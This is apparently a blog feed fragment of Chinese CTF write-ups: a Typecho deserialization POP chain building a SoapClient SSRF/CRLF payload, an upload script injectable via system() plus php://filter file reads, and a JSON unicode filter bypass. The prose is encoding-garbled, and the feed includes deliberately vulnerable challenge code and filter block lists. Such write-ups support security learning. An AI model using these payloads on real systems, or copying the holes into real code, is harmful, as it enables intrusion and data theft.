<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;btis\r\nCookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>



<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>å…ˆæ‰¾èƒ½å¤Ÿè¾“å…¥çš„åœ°æ–¹ï¼Œå…¨å±€æœç´¢unserialize,åœ¨Pluginä¸­æ‰¾åˆ°..</p>
<p>å†ä¹‹åå‘ç°å‡ºé¢˜äººè‡ªå®šä¹‰çš„å†™äº†ä¸€ä¸ªç±»ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è‚¯å®šæœ‰ç”¨ï¼Œè·Ÿè¿‡å»çœ‹çœ‹Tyecho_Dbç±»ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> ç»™å‡ºæç¤º</span></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è®©æˆ‘ä»¬æ‰¾ä¸€ä¸ª__toStringï¼Œå…¨å±€æœç´¢</p>
<p><img src="Ezpop_Revenge/image-20210502165414404.png" alt="image-20210502165414404"></p>
<p>æŒ¨ä¸ªæ‰¾ï¼ŒFeedçš„æ²¡å•¥ç”¨ï¼Œæ²¡æœ‰èƒ½å¤Ÿè°ƒç”¨callçš„åœ°æ–¹ï¼Œconfigçš„æ›´æ²¡ç”¨äº†ï¼Œï¼Œçœ‹åˆ°Query.phpé‡Œé¢çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">          <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">              . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹çœ‹adapteræ˜¯å¦å¯æ§ï¼Œè·Ÿè½¬ä¹‹åå°±ä¼šå‘ç°è¯¥å±æ€§å®Œå…¨å¯æ§ï¼Œé‚£ä¹ˆæ¥ç€æ§åˆ¶_adapter ä½soapClientç±»å³å¯ã€‚</p>
<p>æ‹¼å‡‘payloadï¼š</p>
<p>ssrfçš„ä»£ç å€Ÿé‰´äº†y1ngå¸ˆå‚…çš„ã€‚ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>] = <span class="keyword">new</span> Typecho_Db_Query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;</span>. <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        $headers = [</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rm4&quot;</span></span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;Y1ng^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]= <span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$y1ng = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $y1ng);</span><br><span class="line">$urlen = urlencode($y1ng);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$y1ng = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($y1ng);</span><br></pre></td></tr></table></figure>



<p>æ ¹æ®flag.phpï¼Œæœ€ç»ˆç»“æœè¢«æ‰“å°åˆ°äº†$sessioné‡Œé¢æ‰€ä»¥æˆ‘ä»¬è¦ç©¿è‡ªå·±çš„sesionè¿‡å»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2018_eating_cms</title>
    <url>/2021/04/26/NCTF2018-eating-cms/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><p>è¿™é¢˜å­¦åˆ°çš„ä¸œè¥¿æ˜¯ï¼š</p>
<p>å½“å‘½ä»¤æ‰§è¡Œ../è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ç”¨cd ..;ls ..çš„æ–¹å¼é€æ­¥å‘ä¸Šæ“ä½œã€‚</p>
<h1 id="åšé¢˜æ€è·¯ï¼š"><a href="#åšé¢˜æ€è·¯ï¼š" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h1><p>å¼€å±€æœ‰ä¸ªlogin,ç™»é™†çš„æ—¶å€™</p>
<p><img src="NCTF2018_eating_cms/image-20210426212241594.png" alt="image-20210426212241594"></p>
<p>æ‰€ä»¥çŒœæµ‹ä»–æœ‰æ³¨å†Œé¡µé¢ï¼Œæ³¨å†Œä¸€ä¸‹å°±è¿›å»äº†ï¼Œè¿›å»ä¹‹åå°±å‘ç°ï¼š</p>
<p><img src="NCTF2018_eating_cms/image-20210426213501783.png" alt="image-20210426213501783"></p>
<p>å°è¯•ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæ‰¾åˆ°function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    $whitelist = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, $string[$i]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params">$sql_query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;isadmin&#x27;</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params">$level,$user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> ($res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line">    <span class="keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯•ç€è¯»å–ffffllllaaaagggï¼Œä½†æ˜¯ä»–å·²ç»è¿‡æ»¤äº†ï¼Œä½†æ˜¯parse_urlæœ‰é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</span><br></pre></td></tr></table></figure>

<p>è¯»è¿‡å»å‘ç°m4aaannngggeeeï¼Œå†ä¹‹åå¯ä»¥å‘ç°templates/upload.htmlï¼Œä¸Šä¼ ä¸€äº›å°±èƒ½å‘ç°æ˜¯ä¸ªå‡çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çŸ¥é“æœ‰upllloadddd.phpï¼Œä¼°æ‘¸ç€å°±æ˜¯æ²¡åœ¨templatesè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼ˆè¯´å®è¯æˆ‘ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆæ„ä¹‰- -ï¼Ÿï¼‰</p>
<p>å›åˆ°user.phpè¯»å–uploadçš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload fileé”›ï¿½&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œäºæ˜¯éšä¾¿ä¸Šä¼ ä¸ªä¸œè¥¿è¿‡å»æ”¹æ–‡ä»¶åå°±å¯ä»¥ï¼š</p>
<p><img src="NCTF2018_eating_cms/image-20210426214147334.png" alt="image-20210426214147334"></p>
<p>å‘ç°ä¸èƒ½ç”¨../å»è¯»å–ï¼Œæ‰€ä»¥ç”¨ä¹‹å‰æåˆ°çš„çŸ¥è¯†ç‚¹å°±å¥½</p>
<p><img src="NCTF2018_eating_cms/image-20210426214256593.png" alt="image-20210426214256593"></p>
<p>è¯»å–flagå¾—åˆ°</p>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>encode_and_encode</title>
    <url>/2021/04/21/encode-and-encode/</url>
    <content><![CDATA[<h1 id="é¢˜ç›®æ€è·¯ï¼š"><a href="#é¢˜ç›®æ€è·¯ï¼š" class="headerlink" title="é¢˜ç›®æ€è·¯ï¼š"></a>é¢˜ç›®æ€è·¯ï¼š</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    $banword = [</span><br><span class="line">        <span class="comment">// no path traversal</span></span><br><span class="line">        <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">        <span class="comment">// no stream wrapper</span></span><br><span class="line">        <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">        <span class="comment">// no data exfiltration</span></span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    $content = file_get_contents($page);</span><br><span class="line"><span class="comment">//    echo $content;</span></span><br><span class="line">    <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">        $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>



<p>ç»•è¿‡æ€è·¯ï¼š</p>
<p>â€‹    å¯ä»¥åˆ©ç”¨\u æ¥ç»•è¿‡å­—ç¬¦ä¸²é™åˆ¶ï¼Œåˆ©ç”¨ä¼ªåè®®æµè¯»å–æ–‡ä»¶æ•°æ®</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title>web5</title>
    <url>/2021/05/01/web5/</url>
    <content><![CDATA[<p>æ²¡æƒ³åˆ°ååºåˆ—åŒ–è¿˜å¯ä»¥è¿™æ ·æ“ä½œï¼Œå­¦ä¹ åˆ°äº†å¥¥</p>
